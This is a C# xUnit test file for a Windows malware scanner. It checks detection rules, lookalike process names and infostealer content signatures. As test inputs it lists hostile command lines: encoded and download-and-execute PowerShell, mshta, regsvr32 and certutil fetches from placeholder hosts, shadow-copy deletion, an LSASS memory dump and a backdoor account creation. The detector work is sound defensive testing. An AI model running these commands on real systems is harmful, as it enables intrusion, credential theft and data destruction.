using System.Text;
using ScanMe.Core.Knowledge;
using ScanMe.Core.Trust;
using ScanMe.Core.Util;

namespace ScanMe.Tests;

public class DetectionTests
{
    [Theory]
    [InlineData("powershell.exe -nop -w hidden -enc ZQBjAGgAbwAgAGgAaQAgAHQAaABlAHIAZQA=", "PS_ENCODED")]
    [InlineData("powershell -w hidden -c \"iex (New-Object Net.WebClient).DownloadString('http://1.2.3.4/a')\"", "PS_DOWNLOAD")]
    [InlineData("mshta.exe http://evil.example/x.hta", "MSHTA_URL")]
    [InlineData("regsvr32 /s /n /u /i:http://evil.example/file.sct scrobj.dll", "REGSVR_SCROBJ")]
    [InlineData("certutil -urlcache -split -f http://evil.example/a.exe a.exe", "CERTUTIL_DL")]
    [InlineData("vssadmin delete shadows /all /quiet", "SHADOW_DELETE")]
    [InlineData("rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\lsass.dmp full", "LSASS_DUMP")]
    [InlineData("net user hacker P@ss123 /add", "NET_USER_ADD")]
    public void MaliciousCommandLines_AreDetected(string cmd, string ruleId) =>
        Assert.Contains(CommandLineRules.Match(cmd), r => r.Id == ruleId);

    [Theory]
    [InlineData("\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer")]
    [InlineData("C:\\Windows\\System32\\svchost.exe -k netsvcs -p")]
    [InlineData("\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n")]
    public void NormalCommandLines_AreClean(string cmd) =>
        Assert.Empty(CommandLineRules.Match(cmd));

    [Theory]
    [InlineData("scvhost.exe", "svchost.exe")]
    [InlineData("svch0st.exe", "svchost.exe")]
    [InlineData("lsasss.exe", "lsass.exe")]
    [InlineData("expl0rer.exe", "explorer.exe")]
    [InlineData("Runtime Broker.exe", "RuntimeBroker.exe")]
    public void LookalikeNames_AreDetected(string name, string original) =>
        Assert.Equal(original, SystemProcesses.FindLookalike(name), StringComparer.OrdinalIgnoreCase);

    [Theory]
    [InlineData("svchost.exe")]
    [InlineData("chrome.exe")]
    [InlineData("notepad.exe")]
    [InlineData("airhost.exe")]   // Zoom – frueherer Fehlalarm (aehnlich zu sihost.exe)
    [InlineData("CptHost.exe")]   // Zoom
    [InlineData("conhost.exe")]
    public void GenuineNames_AreNotLookalikes(string name) =>
        Assert.Null(SystemProcesses.FindLookalike(name));

    [Fact]
    public void Infostealer_ContentSignatureMatches()
    {
        var data = Encoding.ASCII.GetBytes(@"... \Google\Chrome\User Data\Default\Login Data ... \Local State ... encrypted_key ... wallet.dat ... \Telegram Desktop\tdata ...");
        Assert.Contains(ContentSignatures.Scan(data, ContentSignatures.Target.Pe), m => m.Sig.Family == "Infostealer");
    }

    [Fact]
    public void GenericApiNames_DoNotTriggerKeylogger()
    {
        var data = Encoding.ASCII.GetBytes("GetAsyncKeyState SetWindowsHookExW VirtualAllocEx WriteProcessMemory CreateRemoteThread");
        Assert.Empty(ContentSignatures.Scan(data, ContentSignatures.Target.Pe));
    }

    [Fact]
    public void WindowsBinaries_AreRecognizedAsWindowsComponents()
    {
        // Katalogsignierte Datei – ohne Katalogpruefung wuerde sie als unsigniert gelten.
        var info = FileTrustService.Shared.Get(Path.Combine(PathUtil.System32, "notepad.exe"));
        if (!info.Exists) return;
        Assert.True(info.IsWindowsComponent, info.SignatureStatusText);
    }

    [Theory]
    [InlineData("\"C:\\Windows\\System32\\rundll32.exe\" C:\\Windows\\System32\\shell32.dll,Control_RunDLL", "shell32.dll")]
    [InlineData("C:\\Windows\\System32\\svchost.exe -k netsvcs", null)]
    public void CommandLineResolution_FindsPayload(string cmd, string? payloadName)
    {
        var (exe, payload) = PathUtil.ResolveCommandLine(cmd);
        Assert.NotNull(exe);
        if (payloadName == null) Assert.Null(payload);
        else Assert.Equal(payloadName, Path.GetFileName(payload), StringComparer.OrdinalIgnoreCase);
    }
}
